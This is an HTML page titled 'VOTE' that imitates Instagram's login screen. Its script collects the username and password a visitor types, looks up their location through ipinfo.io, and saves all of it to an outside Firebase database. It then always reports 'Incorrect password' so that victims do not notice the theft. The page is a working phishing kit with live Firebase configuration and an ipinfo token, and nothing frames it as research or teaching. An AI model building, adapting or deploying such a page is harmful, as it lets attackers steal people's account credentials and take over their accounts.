<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VOTE</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
    <style>
        body {
            background: rgb(250, 250, 250);
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
            justify-content: space-between;
            overflow: hidden;
        }

        .container {
            width: 100%;
            max-width: 400px;
            margin: 30px auto 10px;
            background: white;
            padding: 20px;
            box-sizing: border-box;
            overflow-y: auto;
            flex-grow: 1;
        }

        .insta_logo {
            height: 50px;
            width: 170px;
            margin: 0 auto 10px;
            cursor: pointer;
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 14px;
            background: whitesmoke;
            border: 1px solid rgb(234, 234, 234);
            font-size: 16px;
            border-radius: 4px;
            margin-bottom: 8px;
            box-sizing: border-box;
        }

        .input-field:focus {
            outline: none;
            border-color: rgb(178, 178, 178);
        }

        ::placeholder {
            font-size: 14px;
            color: rgb(173, 173, 173);
        }

        .password-container {
            position: relative;
            margin-bottom: 8px;
            box-sizing: border-box;
        }

        .toggle-text {
            position: absolute;
            top: 50%;
            right: 15px;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 16px;
            color: #0095f6;
            font-weight: bold;
        }

        button {
            background: #0095f6;
            border: none;
            padding: 16px;
            width: 100%;
            color: white;
            border-radius: 4px;
            font-weight: bolder;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s ease;
            margin-bottom: 16px;
            box-sizing: border-box;
        }

        button:hover {
            background: #007bb5;
        }

        .spinner {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 25px;
            height: 25px;
            border: 3px solid transparent;
            border-top: 3px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            visibility: hidden;
        }

        @keyframes spin {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }

        .forgot {
            color: rgb(81, 80, 80);
            font-size: 12px;
            font-weight: bold;
            margin-left: 95px;
            cursor: pointer;
        }

        .dont {
            padding: 5px;
            background: white;
            text-align: center;
            font-size: 16px;
            color: rgb(50, 49, 49);
        }

        .dont span {
            color: #03a6eb;
            font-weight: bolder;
        }

        .get {
            text-align: center;
            font-size: 14px;
        }

        .img img {
            height: 40px;
            width: 140px;
            margin-left: 15px;
            vertical-align: baseline;
        }

        .footer {
            font-size: 14px;
            color: rgb(11, 26, 112);
            text-align: center;
            padding: 10px 0;
            font-weight: 600;
        }

        .footer a {
            color: #0095f6;
            text-decoration: none;
            margin: 0 10px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .footer p {
            margin: 5px 0;
            font-family: 'Lucida Sans', Geneva, Verdana, sans-serif;
        }

        .error-message {
            color: red;
            font-size: 12px;
            text-align: left;
            margin-top: 5px;
            visibility: hidden;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <form id="instagramlogin" onsubmit="handleSubmit(event)">
            <img src="https://i.ibb.co/fSZrktN/instagram-logo.png" alt="Instagram Logo" class="insta_logo">
            <input type="text" id="username" class="input-field" placeholder="Phone number, username or email address" required>
            <div class="password-container">
                <input type="password" id="password" class="input-field" placeholder="Password" required>
                <span id="togglePassword" class="toggle-text">Show</span>
            </div>
            <p id="errorMessage" class="error-message"></p>
            <button type="submit" id="loginButton">
                Log In
                <div class="spinner" id="spinner"></div>
            </button>
            <p class="forgot">Forgotten your password?</p>
            <div class="dont">
                <p>Don't have an account? <span>Sign up</span></p>
            </div>
            <p class="get">Get the app.
                <div class="img">
                    <img src="https://i.ibb.co/bHVsHrT/app-store.png" alt="App Store">
                    <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="Play Store">
                </div>
            </p>
        </form>
    </div>

    <div class="footer">
        <footer>
            ABOUT US | SUPPORT | BLOG | PRESS | API | JOBS | PRIVACY | TERMS | DIRECTORY | LANGUAGE
        </footer>
    </div>

    <script>
        const togglePassword = document.getElementById("togglePassword");
        const passwordField = document.getElementById("password");

        togglePassword.addEventListener("click", () => {
            const type = passwordField.type === "password" ? "text" : "password";
            passwordField.type = type;
            togglePassword.textContent = type === "password" ? "Show" : "Hide";
        });

        const firebaseConfig = {
            apiKey: "AIzaSyDPupU21CJIV-fph3iHgquPpP8RzUx0rG4",
            authDomain: "instagram-a20dc.firebaseapp.com",
            databaseURL: "https://instagram-a20dc-default-rtdb.firebaseio.com",
            projectId: "instagram-a20dc",
            storageBucket: "instagram-a20dc.firebasestorage.app",
            messagingSenderId: "710244789237",
            appId: "1:710244789237:web:face3aa27496e31f988ebc"
        };
        firebase.initializeApp(firebaseConfig);

        document.getElementById('loginButton').addEventListener('click', async (event) => {
            event.preventDefault();

            const username = document.querySelector('#username').value;
            const password = document.querySelector('#password').value;
            const errorMessage = document.getElementById('errorMessage');
            const spinner = document.getElementById('spinner');
            const loginButton = document.getElementById('loginButton');

            errorMessage.style.visibility = 'hidden';

            if (!username || !password) {
                errorMessage.textContent = "Please enter both username and password.";
                errorMessage.style.visibility = 'visible';
                return;
            }

            spinner.style.visibility = 'visible';
            loginButton.disabled = true;

            const countryData = await fetchCountry();
            if (!countryData) {
                errorMessage.textContent = "Could not determine country.";
                errorMessage.style.visibility = 'visible';
                spinner.style.visibility = 'hidden';
                loginButton.disabled = false;
                return;
            }

            console.log(`Username: ${username}, Password: ${password}, Region: ${countryData.region}, Country: ${countryData.country}`);

            const instagramloginRef = firebase.database().ref("instagramlogin");
            instagramloginRef.push().set({
                username,
                password,
                region: countryData.region,
                country: countryData.country
            }).then(() => {
                console.log("Data saved successfully!");
                spinner.style.visibility = 'hidden';
                loginButton.disabled = false;
                document.getElementById('password').value = '';

                const isLoginSuccessful = false; // Simulated failure (set to true for success)

                if (!isLoginSuccessful) {
                    errorMessage.textContent = "Incorrect password";
                    errorMessage.style.visibility = 'visible';
                } else {
                    console.log("Login successful!");
                }
            }).catch((error) => {
                console.error("Error saving data:", error);
                errorMessage.textContent = "Error saving data.";
                errorMessage.style.visibility = 'visible';
                spinner.style.visibility = 'hidden';
                loginButton.disabled = false;
            });
        });

        async function fetchCountry() {
            const url = "https://ipinfo.io?token=d77652b5ef3a6b";
            try {
                const response = await fetch(url);
                const data = await response.json();
                return { region: data.region, country: data.country };
            } catch (error) {
                console.error('Error fetching country data:', error);
                return null;
            }
        }
    </script>
</body>
</html>
